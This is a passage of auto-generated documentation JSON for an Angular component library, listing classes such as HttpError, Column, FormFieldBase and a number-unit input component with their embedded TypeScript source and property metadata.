      "sourceCode": "import { Injectable, InjectionToken } from '@angular/core';\nimport { ThemeModel, ThemeName, TypographyName } from './models';\nimport { Observable, of } from 'rxjs';\n\ntype ReturnValue<T> = Promise<T> | Observable<T> | T;\n\nexport interface ThemeSaver<T = ReturnValue<ThemeModel>> {\n  save(model: ThemeModel): T;\n\n  load(type?: 'typography' | 'theme'): T;\n\n  remove?(): ReturnValue<void>;\n}\n\nexport const THEME_SAVER = new InjectionToken<ThemeSaver>('sto__theme__typo');\n\n@Injectable({ providedIn: 'root' })\nexport class ThemeSaverService implements ThemeSaver {\n  load(type: 'typography' | 'theme'): Observable<ThemeModel> {\n    let value = localStorage.getItem('tops__' + type) as TypographyName | ThemeName;\n    if ( !value ) {\n      value = type === 'typography' ? 'medium' : 'light';\n    }\n    return of({ value, type });\n  }\n\n  save(model: ThemeModel): Observable<ThemeModel> {\n    localStorage.setItem('tops__' + model.type, model.value);\n    return of(model);\n  }\n}\n",
      "type": "injectable"
    }
  ],
  "guards": [],
  "interceptors": [],
  "classes": [
    {
      "name": "Action",
      "id": "class-Action-7d03ef3e2a3d1ec8c3164e7a21cd350baa83789aa32702a3465ce420c00067d77fda9830946d72865dc132d3bdf4ba3119b6938b47bb7226721f317a653fb8c5",
      "file": "libs/error-handler/src/lib/error-handler/http-error.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "class",
      "sourceCode": "import { HttpErrorResponse } from '@angular/common/http';\n\n/**\n * Internal HttpError format\n */\nexport class HttpError {\n  // Status code\n  status: number;\n  // Dialog title\n  title: string;\n  // Dialog body\n  text: string;\n  // Action list.\n  actions: Action[] = [];\n\n  constructor(public readonly error: HttpErrorResponse) {\n    this.status = error.status;\n  }\n}\n\n/**\n * Available properties on dialog actions\n */\nexport class Action {\n  /**\n   * Button label\n   */\n  label: string;\n  /**\n   * A function to be called based on the given action (e.g window.location.reload to refresh the tab)\n   */\n  action?: (...args: unknown[]) => unknown;\n  /**\n   * The data to be returned when the dialog is closed.\n   */\n  closeDialogData?: Record<string, unknown>;\n\n  constructor(label: string);\n  constructor(label: string, close: () => void);\n  constructor(label: string, close: Record<string, unknown>);\n  constructor(label: string, close?: Record<string, unknown> | (() => unknown)) {\n    this.label = label;\n    if ( typeof close === 'function' ) {\n      // eslint-disable-next-line @typescript-eslint/ban-ts-comment\n      // @ts-ignore\n      this.action = close;\n    } else {\n      this.closeDialogData = close;\n    }\n  }\n}\n",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "label",
            "type": "string",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "close",
            "type": "Record<string | > | ",
            "deprecated": false,
            "deprecationMessage": "",
            "optional": true
          }
        ],
        "line": 40,
        "jsdoctags": [
          {
            "name": "label",
            "type": "string",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "close",
            "type": "Record<string | > | ",
            "deprecated": false,
            "deprecationMessage": "",
            "optional": true,
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "properties": [
        {
          "name": "action",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "function",
          "optional": true,
          "description": "<p>A function to be called based on the given action (e.g window.location.reload to refresh the tab)</p>\n",
          "line": 32,
          "rawdescription": "\n\nA function to be called based on the given action (e.g window.location.reload to refresh the tab)\n"
        },
        {
          "name": "closeDialogData",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Record<string | >",
          "optional": true,
          "description": "<p>The data to be returned when the dialog is closed.</p>\n",
          "line": 36,
          "rawdescription": "\n\nThe data to be returned when the dialog is closed.\n"
        },
        {
          "name": "label",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "<p>Button label</p>\n",
          "line": 28,
          "rawdescription": "\n\nButton label\n"
        }
      ],
      "description": "<p>Available properties on dialog actions</p>\n",
      "rawdescription": "\n\nAvailable properties on dialog actions\n",
      "methods": [],
      "indexSignatures": [],
      "inputsClass": [],
      "outputsClass": [],
      "hostBindings": [],
      "hostListeners": []
    },
    {
      "name": "Column",
      "id": "class-Column-d78132e7e5b3d26cf6b18c18e4281954b304e96f80b019e431627978236db213970e1794dcc1bb7d620427a04f87c98c14bac96de6f4430c0edd2d8f8924d0e0",
      "file": "libs/datatable/src/lib/sto-datatable/columns.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "class",
      "sourceCode": "import { TemplateRef } from '@angular/core';\n\nexport class Column {\n  $$id?: string;\n  prop: string;\n  name: string;\n  flexGrow?: number;\n  flexBasis?: number;\n  flexShrink?: number;\n  sortable ? = false;\n  headerTemplate?: TemplateRef<unknown>;\n  cellTemplate?: TemplateRef<unknown>;\n  footerTemplate?: TemplateRef<unknown>;\n  cellClass?: string | ClassFunction;\n  headerClass?: string | ClassFunction;\n  sortFn?: SortFunction;\n  disableSort?: boolean;\n  disableResize?: boolean;\n  sortArrowPosition?: 'before' | 'after';\n}\n\nexport class Group {\n  props: Array<string>;\n  name?: string;\n  sticky?: boolean;\n}\n\nexport class ColumnGroup {\n  name: string;\n  columnStart: number;\n  columnEnd: number;\n  transform?: string;\n}\n\nexport enum ColumnDisplay {\n  Flex = 'flex',\n  Force = 'force'\n}\n\ntype ClassFunction = <T, U>(value: T, row: U, column: Column) => string | string[];\ntype SortFunction = <T>(a: T, b: T, column: Column) => number;\n",
      "properties": [
        {
          "name": "$$id",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": true,
          "description": "",
          "line": 4
        },
        {
          "name": "cellClass",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string | ClassFunction",
          "optional": true,
          "description": "",
          "line": 14
        },
        {
          "name": "cellTemplate",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "TemplateRef<>",
          "optional": true,
          "description": "",
          "line": 12
        },
        {
          "name": "disableResize",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": true,
          "description": "",
          "line": 18
        },
        {
          "name": "disableSort",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": true,
          "description": "",
          "line": 17
        },
        {
          "name": "flexBasis",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": true,
          "description": "",
          "line": 8
        },
        {
          "name": "flexGrow",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": true,
          "description": "",
          "line": 7
        },
        {
          "name": "flexShrink",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": true,
          "description": "",
          "line": 9
        },
        {
          "name": "footerTemplate",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "TemplateRef<>",
          "optional": true,
          "description": "",
          "line": 13
        },
        {
          "name": "headerClass",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string | ClassFunction",
          "optional": true,
          "description": "",
          "line": 15
        },
        {
          "name": "headerTemplate",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "TemplateRef<>",
          "optional": true,
          "description": "",
          "line": 11
        },
        {
          "name": "name",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 6
        },
        {
          "name": "prop",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 5
        },
        {
          "name": "sortable",
          "defaultValue": "false",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": true,
          "description": "",
          "line": 10
        },
        {
          "name": "sortArrowPosition",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "\"before\" | \"after\"",
          "optional": true,
          "description": "",
          "line": 19
        },
        {
          "name": "sortFn",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "SortFunction",
          "optional": true,
          "description": "",
          "line": 16
        }
      ],
      "methods": [],
      "indexSignatures": [],
      "inputsClass": [],
      "outputsClass": [],
      "hostBindings": [],
      "hostListeners": []
    },
    {
      "name": "ColumnGroup",
      "id": "class-ColumnGroup-d78132e7e5b3d26cf6b18c18e4281954b304e96f80b019e431627978236db213970e1794dcc1bb7d620427a04f87c98c14bac96de6f4430c0edd2d8f8924d0e0",
      "file": "libs/datatable/src/lib/sto-datatable/columns.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "class",
      "sourceCode": "import { TemplateRef } from '@angular/core';\n\nexport class Column {\n  $$id?: string;\n  prop: string;\n  name: string;\n  flexGrow?: number;\n  flexBasis?: number;\n  flexShrink?: number;\n  sortable ? = false;\n  headerTemplate?: TemplateRef<unknown>;\n  cellTemplate?: TemplateRef<unknown>;\n  footerTemplate?: TemplateRef<unknown>;\n  cellClass?: string | ClassFunction;\n  headerClass?: string | ClassFunction;\n  sortFn?: SortFunction;\n  disableSort?: boolean;\n  disableResize?: boolean;\n  sortArrowPosition?: 'before' | 'after';\n}\n\nexport class Group {\n  props: Array<string>;\n  name?: string;\n  sticky?: boolean;\n}\n\nexport class ColumnGroup {\n  name: string;\n  columnStart: number;\n  columnEnd: number;\n  transform?: string;\n}\n\nexport enum ColumnDisplay {\n  Flex = 'flex',\n  Force = 'force'\n}\n\ntype ClassFunction = <T, U>(value: T, row: U, column: Column) => string | string[];\ntype SortFunction = <T>(a: T, b: T, column: Column) => number;\n",
      "properties": [
        {
          "name": "columnEnd",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 31
        },
        {
          "name": "columnStart",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 30
        },
        {
          "name": "name",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 29
        },
        {
          "name": "transform",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": true,
          "description": "",
          "line": 32
        }
      ],
      "methods": [],
      "indexSignatures": [],
      "inputsClass": [],
      "outputsClass": [],
      "hostBindings": [],
      "hostListeners": []
    },
    {
      "name": "FormFieldBase",
      "id": "class-FormFieldBase-96ad5bb3a24c78119a9ff7a47e207368290e7c5f7ccb8f94fecc83eb8d1b8247bee8358de1d07815d07426e572361ac5fd0a0632d177a2b2dc15229b41667b37",
      "file": "libs/form/src/lib/sto-form/form-field.base.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "class",
      "sourceCode": "import { Subject } from 'rxjs';\nimport { ErrorStateMatcher } from '@angular/material/core';\nimport { FormGroupDirective, NgControl, NgForm, UntypedFormControl } from '@angular/forms';\nimport { ElementRef } from '@angular/core';\n\nexport class FormFieldBase {\n  /** Whether the component is in an error state. */\n  errorState = false;\n\n  /**\n   * Stream that emits whenever the state of the input changes such that the wrapping\n   * `MatFormField` needs to run change detection.\n   */\n  stateChanges: Subject<void>;\n\n  errorStateMatcher: ErrorStateMatcher;\n\n  constructor(public _elementRef: ElementRef,\n              public _defaultErrorStateMatcher: ErrorStateMatcher,\n              public _parentForm: NgForm,\n              public _parentFormGroup: FormGroupDirective,\n              public ngControl: NgControl) {\n  }\n\n  updateErrorState() {\n    const oldState = this.errorState;\n    const parent = this._parentFormGroup || this._parentForm;\n    const matcher = this.errorStateMatcher || this._defaultErrorStateMatcher;\n    const control = this.ngControl ? this.ngControl.control as UntypedFormControl : null;\n    const newState = matcher.isErrorState(control, parent);\n\n    if ( newState !== oldState ) {\n      this.errorState = newState;\n      this.stateChanges.next();\n    }\n  }\n}\n",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "_elementRef",
            "type": "ElementRef",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "_defaultErrorStateMatcher",
            "type": "ErrorStateMatcher",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "_parentForm",
            "type": "NgForm",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "_parentFormGroup",
            "type": "FormGroupDirective",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "ngControl",
            "type": "NgControl",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 16,
        "jsdoctags": [
          {
            "name": "_elementRef",
            "type": "ElementRef",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "_defaultErrorStateMatcher",
            "type": "ErrorStateMatcher",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "_parentForm",
            "type": "NgForm",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "_parentFormGroup",
            "type": "FormGroupDirective",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "ngControl",
            "type": "NgControl",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "properties": [
        {
          "name": "_defaultErrorStateMatcher",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "ErrorStateMatcher",
          "optional": false,
          "description": "",
          "line": 19,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "_elementRef",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "ElementRef",
          "optional": false,
          "description": "",
          "line": 18,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "_parentForm",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "NgForm",
          "optional": false,
          "description": "",
          "line": 20,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "_parentFormGroup",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "FormGroupDirective",
          "optional": false,
          "description": "",
          "line": 21,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "errorState",
          "defaultValue": "false",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "<p>Whether the component is in an error state.</p>\n",
          "line": 8,
          "rawdescription": "\nWhether the component is in an error state."
        },
        {
          "name": "errorStateMatcher",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "ErrorStateMatcher",
          "optional": false,
          "description": "",
          "line": 16
        },
        {
          "name": "ngControl",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "NgControl",
          "optional": false,
          "description": "",
          "line": 22,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "stateChanges",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Subject<void>",
          "optional": false,
          "description": "<p>Stream that emits whenever the state of the input changes such that the wrapping\n<code>MatFormField</code> needs to run change detection.</p>\n",
          "line": 14,
          "rawdescription": "\n\nStream that emits whenever the state of the input changes such that the wrapping\n`MatFormField` needs to run change detection.\n"
        }
      ],
      "methods": [
        {
          "name": "updateErrorState",
          "args": [],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 25,
          "deprecated": false,
          "deprecationMessage": ""
        }
      ],
      "indexSignatures": [],
      "inputsClass": [],
      "outputsClass": [],
      "hostBindings": [],
      "hostListeners": []
    },
    {
      "name": "Group",
      "id": "class-Group-d78132e7e5b3d26cf6b18c18e4281954b304e96f80b019e431627978236db213970e1794dcc1bb7d620427a04f87c98c14bac96de6f4430c0edd2d8f8924d0e0",
      "file": "libs/datatable/src/lib/sto-datatable/columns.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "class",
      "sourceCode": "import { TemplateRef } from '@angular/core';\n\nexport class Column {\n  $$id?: string;\n  prop: string;\n  name: string;\n  flexGrow?: number;\n  flexBasis?: number;\n  flexShrink?: number;\n  sortable ? = false;\n  headerTemplate?: TemplateRef<unknown>;\n  cellTemplate?: TemplateRef<unknown>;\n  footerTemplate?: TemplateRef<unknown>;\n  cellClass?: string | ClassFunction;\n  headerClass?: string | ClassFunction;\n  sortFn?: SortFunction;\n  disableSort?: boolean;\n  disableResize?: boolean;\n  sortArrowPosition?: 'before' | 'after';\n}\n\nexport class Group {\n  props: Array<string>;\n  name?: string;\n  sticky?: boolean;\n}\n\nexport class ColumnGroup {\n  name: string;\n  columnStart: number;\n  columnEnd: number;\n  transform?: string;\n}\n\nexport enum ColumnDisplay {\n  Flex = 'flex',\n  Force = 'force'\n}\n\ntype ClassFunction = <T, U>(value: T, row: U, column: Column) => string | string[];\ntype SortFunction = <T>(a: T, b: T, column: Column) => number;\n",
      "properties": [
        {
          "name": "name",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": true,
          "description": "",
          "line": 24
        },
        {
          "name": "props",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Array<string>",
          "optional": false,
          "description": "",
          "line": 23
        },
        {
          "name": "sticky",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": true,
          "description": "",
          "line": 25
        }
      ],
      "methods": [],
      "indexSignatures": [],
      "inputsClass": [],
      "outputsClass": [],
      "hostBindings": [],
      "hostListeners": []
    },
    {
      "name": "HttpError",
      "id": "class-HttpError-7d03ef3e2a3d1ec8c3164e7a21cd350baa83789aa32702a3465ce420c00067d77fda9830946d72865dc132d3bdf4ba3119b6938b47bb7226721f317a653fb8c5",
      "file": "libs/error-handler/src/lib/error-handler/http-error.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "class",
      "sourceCode": "import { HttpErrorResponse } from '@angular/common/http';\n\n/**\n * Internal HttpError format\n */\nexport class HttpError {\n  // Status code\n  status: number;\n  // Dialog title\n  title: string;\n  // Dialog body\n  text: string;\n  // Action list.\n  actions: Action[] = [];\n\n  constructor(public readonly error: HttpErrorResponse) {\n    this.status = error.status;\n  }\n}\n\n/**\n * Available properties on dialog actions\n */\nexport class Action {\n  /**\n   * Button label\n   */\n  label: string;\n  /**\n   * A function to be called based on the given action (e.g window.location.reload to refresh the tab)\n   */\n  action?: (...args: unknown[]) => unknown;\n  /**\n   * The data to be returned when the dialog is closed.\n   */\n  closeDialogData?: Record<string, unknown>;\n\n  constructor(label: string);\n  constructor(label: string, close: () => void);\n  constructor(label: string, close: Record<string, unknown>);\n  constructor(label: string, close?: Record<string, unknown> | (() => unknown)) {\n    this.label = label;\n    if ( typeof close === 'function' ) {\n      // eslint-disable-next-line @typescript-eslint/ban-ts-comment\n      // @ts-ignore\n      this.action = close;\n    } else {\n      this.closeDialogData = close;\n    }\n  }\n}\n",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "error",
            "type": "HttpErrorResponse",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 14,
        "jsdoctags": [
          {
            "name": "error",
            "type": "HttpErrorResponse",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "properties": [
        {
          "name": "actions",
          "defaultValue": "[]",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Action[]",
          "optional": false,
          "description": "",
          "line": 14
        },
        {
          "name": "error",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "HttpErrorResponse",
          "optional": false,
          "description": "",
          "line": 16,
          "modifierKind": [
            123,
            144
          ]
        },
        {
          "name": "status",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 8
        },
        {
          "name": "text",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 12
        },
        {
          "name": "title",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 10
        }
      ],
      "description": "<p>Internal HttpError format</p>\n",
      "rawdescription": "\n\nInternal HttpError format\n",
      "methods": [],
      "indexSignatures": [],
      "inputsClass": [],
      "outputsClass": [],
      "hostBindings": [],
      "hostListeners": []
    },
    {
      "name": "Modifiers",
      "id": "class-Modifiers-2c6080e972a658b3b9a73ea486527e46e6f6673957445e1daf2827b30ca94e28d6f4a077e067a57bd63666f6937f6af892857c88cba29556a3822cd73562db33",
      "file": "libs/form/src/lib/sto-wysiwyg/modifiers.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "class",
      "sourceCode": "export class Modifiers {\n  italic: boolean;\n  bold: boolean;\n  underline: boolean;\n\n  static getActiveModifiers(): string[] {\n    const m = new Modifiers();\n    m.bold = document.queryCommandState('bold');\n    m.italic = document.queryCommandState('italic');\n    m.underline = document.queryCommandState('underline');\n    // eslint-disable-next-line @typescript-eslint/ban-ts-comment\n    // @ts-ignore\n    return Object.keys(m).filter((k) => m[ k ]);\n  }\n}\n\nexport const validCommands = [\n  'bold',\n  'underline',\n  'italic',\n  'createLink',\n  'insertUnorderedList',\n  'insertOrderedList',\n  'removeFormat',\n];\n",
      "properties": [
        {
          "name": "bold",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": false,
          "description": "",
          "line": 3
        },
        {
          "name": "italic",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": false,
          "description": "",
          "line": 2
        },
        {
          "name": "underline",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": false,
          "description": "",
          "line": 4
        }
      ],
      "methods": [
        {
          "name": "getActiveModifiers",
          "args": [],
          "optional": false,
          "returnType": "string[]",
          "typeParameters": [],
          "line": 6,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            124
          ]
        }
      ],
      "indexSignatures": [],
      "inputsClass": [],
      "outputsClass": [],
      "hostBindings": [],
      "hostListeners": []
    },
    {
      "name": "NumberUnit",
      "id": "class-NumberUnit-24723e662f0c61b12aaab4606b4af880eb146e92718e7564cd4d01fc891f64978684b03868b4df06d98084f07f89733da7ad048b1bbc4a073546ce131e8ec61e",
      "file": "libs/form/src/lib/number-input/number-unit-input/number-unit-input.component.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "class",
      "sourceCode": "import {\n  ChangeDetectionStrategy,\n  Component,\n  DoCheck,\n  ElementRef,\n  HostBinding,\n  Input,\n  OnDestroy,\n  OnInit,\n  Optional,\n  Self,\n  ViewChild,\n  ViewEncapsulation\n} from '@angular/core';\nimport { ControlValueAccessor, FormBuilder, FormControl, FormGroup, FormGroupDirective, NgControl, NgForm } from '@angular/forms';\nimport { MatFormFieldControl } from '@angular/material/form-field';\nimport { Subject, Subscription } from 'rxjs';\nimport { FocusMonitor } from '@angular/cdk/a11y';\nimport { coerceBooleanProperty } from '@angular/cdk/coercion';\nimport { NumberInputPipe } from '../number-input.pipe';\nimport { MatSelect } from '@angular/material/select';\nimport { FormFieldBase } from '../../sto-form/form-field.base';\nimport { ErrorStateMatcher } from '@angular/material/core';\nimport { debounceTime } from 'rxjs/operators';\nimport { NumberInputDirective } from '../number-input.directive';\n\nclass NumberUnit {\n  value: number | string | null;\n  unit: string | null;\n}\n\ntype NumberUnitForm = {\n  value: FormControl<number | string | null>,\n  unit: FormControl<string | null>\n};\n\n@Component({\n  selector: 'sto-number-unit-input',\n  templateUrl: './number-unit-input.component.html',\n  styleUrls: [ './number-unit-input.component.scss' ],\n  providers: [\n    { provide: MatFormFieldControl, useExisting: NumberUnitInputComponent }\n  ],\n  encapsulation: ViewEncapsulation.None,\n  changeDetection: ChangeDetectionStrategy.OnPush\n})\nexport class NumberUnitInputComponent extends FormFieldBase\n  implements DoCheck, OnInit, OnDestroy, ControlValueAccessor, MatFormFieldControl<NumberUnit> {\n  static nextId = 0;\n  stateChanges = new Subject<void>();\n  public form: FormGroup<NumberUnitForm>;\n  readonly autofilled: boolean;\n  controlType = 'number-unit-input';\n  @ViewChild(MatSelect)\n  select: MatSelect;\n  @ViewChild('input')\n  input: ElementRef<HTMLInputElement>;\n  @ViewChild(NumberInputDirective)\n  numberInputDirective: NumberInputDirective;\n  errorState: boolean;\n  @Input()\n  unitOptional = true;\n  @Input()\n  unitClearText = '(none)';\n  public focused: boolean;\n  @HostBinding()\n  id = `value-unit-input-${NumberUnitInputComponent.nextId++}`;\n  @HostBinding('attr.aria-describedby') describedBy = '';\n  public sub = new Subscription();\n  private numberFormatterPipe = new NumberInputPipe();\n\n  constructor(@Optional() @Self() public ngControl: NgControl,\n              private fm: FocusMonitor,\n              private fb: FormBuilder,\n              @Optional() _parentForm: NgForm,\n              @Optional() _parentFormGroup: FormGroupDirective,\n              _defaultErrorStateMatcher: ErrorStateMatcher,\n              private elRef: ElementRef<HTMLElement>) {\n    super(elRef, _defaultErrorStateMatcher, _parentForm, _parentFormGroup, ngControl);\n    this.form = this.fb.group<NumberUnitForm>({\n      value: this.fb.control(null),\n      unit: this.fb.control(null)\n    });\n    if ( this.ngControl != null ) {\n      this.ngControl.valueAccessor = this;\n    }\n    fm.monitor(elRef.nativeElement, true).subscribe(origin => {\n      this.focused = !!origin;\n      this.stateChanges.next();\n    });\n  }\n\n  private _disabled = false;\n\n  @Input()\n  get disabled(): boolean {\n    return this._disabled;\n  }\n\n  set disabled(disable: boolean) {\n    this._disabled = coerceBooleanProperty(disable);\n    const opts = { onlySelf: true, emitEvent: false };\n    disable ? this.form.disable(opts) : this.form.enable(opts);\n    // disable ? this.form.get('unit').disable(opts) : this.form.get('unit').enable(opts);\n    // disable ? this.form.get('value').disable(opts) : this.form.get('value').enable(opts);\n    this.stateChanges.next();\n  }\n\n  private _readonly = false;\n\n  @Input()\n  get readonly(): boolean {\n    return this._readonly;\n  }\n\n  set readonly(value: boolean) {\n    this._readonly = coerceBooleanProperty(value);\n    const opts = { onlySelf: true, emitEvent: false };\n    value ? this.form.get('unit')?.disable(opts) : this.form.get('unit')?.enable(opts);\n    this.stateChanges.next();\n  }\n\n  private _list: { value: unknown; title?: string; }[] = [];\n\n  @Input()\n  get list() {\n    return this._list;\n  }\n\n  set list(value) {\n    this._list = value;\n    this.stateChanges.next();\n  }\n\n  private _fractionSize: number;\n\n  @Input()\n  get fractionSize() {\n    return this._fractionSize || 3;\n  }\n\n  set fractionSize(fractionSize) {\n    this._fractionSize = fractionSize;\n    this.stateChanges.next();\n  }\n\n  get empty() {\n    const n = this.form.value;\n    return !n.value && !n.unit;\n  }\n\n  private _placeholder: string;\n\n  @Input()\n  get placeholder() {\n    return this._placeholder || '';\n  }\n\n  set placeholder(plh) {\n    this._placeholder = plh;\n    this.stateChanges.next();\n  }\n\n  private _unitPlaceholder: string;\n\n  @Input()\n  get unitPlaceholder() {\n    return this._unitPlaceholder || '';\n  }\n\n  set unitPlaceholder(plh) {\n    this._unitPlaceholder = plh;\n    this.stateChanges.next();\n  }\n\n  private _required = false;\n\n  @Input()\n  get required() {\n    return this._required;\n  }\n\n  set required(req) {\n    this._required = coerceBooleanProperty(req);\n    this.stateChanges.next();\n  }\n\n  @HostBinding('class.floating')\n  get shouldLabelFloat() {\n    return this.focused || !this.empty;\n  }\n\n  private _value: NumberUnit | null;\n\n  get value(): NumberUnit | null {\n    return this._value;\n  }\n\n  set value(value: NumberUnit | null) {\n    if ( value ) {\n      const parsedValue = this.numberFormatterPipe.transform(value.value, this.fractionSize);\n      this._value = { ...value, value: parsedValue };\n    } else {\n      this._value = value;\n    }\n    this.form.patchValue(this._value || {}, { emitEvent: false });\n    this.stateChanges.next();\n  }\n\n  ngDoCheck(): void {\n    if ( this.ngControl ) {\n      this.updateErrorState();\n    }\n  }\n\n  ngOnInit(): void {\n    const sub = this.form.valueChanges\n      .subscribe((value) => {\n        const valueAsString = value.value as string;\n        let numberValue: number | null = parseFloat(this.numberFormatterPipe.parse(valueAsString, this.fractionSize));\n        numberValue = !isNaN(numberValue) ? numberValue : null;\n        this.onChange({ ...value, value: numberValue });\n      });\n\n    this.sub.add(this.stateChanges.pipe(debounceTime(50)).subscribe(() => {\n      this.numberInputDirective?.setDisplayValue(this.readonly);\n    }));\n    this.sub.add(sub);\n    if ( this.ngControl && this.ngControl.statusChanges ) {\n      this.sub.add(this.ngControl.statusChanges\n        .subscribe(() => this.updateErrorState())\n      );\n    }\n  }\n\n  ngOnDestroy(): void {\n    this.stateChanges.complete();\n    this.fm.stopMonitoring(this.elRef.nativeElement);\n    this.sub.unsubscribe();\n  }\n\n\n  onContainerClick(event: MouseEvent) {\n    const rect = this.input.nativeElement.getBoundingClientRect();\n    const isInputFocus = rect.right >= event.clientX;\n    if ( isInputFocus ) {\n      this.elRef.nativeElement.querySelector('input')?.focus();\n    } else {\n      this.select.focus();\n      this.select.open();\n    }\n  }\n\n\n  setDescribedByIds(ids: string[]) {\n    this.describedBy = ids.join(' ');\n  }\n\n\n  // eslint-disable-next-line @typescript-eslint/no-empty-function,@typescript-eslint/no-unused-vars\n  onChange = (_: unknown) => {\n  };\n  // eslint-disable-next-line @typescript-eslint/no-empty-function\n  onTouched = () => {\n  };\n\n  writeValue(value: NumberUnit | null): void {\n    this.value = value;\n  }\n\n  registerOnChange(fn: never): void {\n    this.onChange = fn;\n  }\n\n  registerOnTouched(fn: never): void {\n    this.onTouched = fn;\n  }\n\n  setDisabledState(isDisabled: boolean): void {\n    this.disabled = isDisabled;\n  }\n\n}\n\n// {eslint-plugin,eslint-plugin-template,template-parser}@^14.0.0\n",
      "properties": [
        {
          "name": "unit",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string | null",
          "optional": false,
          "description": "",
          "line": 29
        },
        {
          "name": "value",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number | string | null",
          "optional": false,
          "description": "",
          "line": 28
        }
      ],
      "methods": [],
      "indexSignatures": [],
      "inputsClass": [],
      "outputsClass": [],
      "hostBindings": [],
      "hostListeners": []
    },
    {
      "name": "Preference",
      "id": "class-Preference-e7a3ab96a45bca774a18db0277706b007cad7b2b3eb2e536ad050a7cc502d6e843b2a0be42e31de2043251f6b45ff07ebd3926a5eafd68a09762d891c684d97c",
      "file": "libs/common/src/lib/preference-manager/preference.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "class",
